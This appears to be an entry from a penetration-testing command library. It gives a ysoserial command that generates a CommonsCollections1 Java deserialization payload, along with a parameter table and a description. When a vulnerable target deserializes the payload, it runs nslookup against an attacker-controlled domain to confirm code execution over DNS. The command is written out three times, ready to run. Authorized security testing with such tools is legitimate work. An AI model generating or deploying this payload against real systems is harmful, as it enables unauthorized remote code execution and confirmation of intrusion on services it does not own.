---
id: cmd-ysoserial-nslookup
data: >-
  java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'nslookup
  mealstest.demonsec.us' > serialtest
tags:
  - payload-gen
  - dns
type: command
output: null
executor: bash
platforms:
  - Linux
  - Java
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:42.596Z'
verified: false
validated: true
submitted: true
---
# ysoserial-generate-commonscollections-nslookup

## Command

```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'nslookup mealstest.demonsec.us' > serialtest
```

## Description

Creates a payload to execute nslookup on a controlled domain, confirming network access via DNS logs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| CommonsCollections1 | Gadget chain | Yes |
| 'nslookup mealstest.demonsec.us' | DNS query command | Yes |
| > serialtest | Output file | Yes |

## Examples

### Basic Usage

```bash
java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'nslookup mealstest.demonsec.us' > serialtest
```

## Expected Output

Binary in serialtest; execution causes DNS query to attacker's server.

## Related

- [[Related Procedure: Demonstrate Network Interaction with Nslookup Payload]]
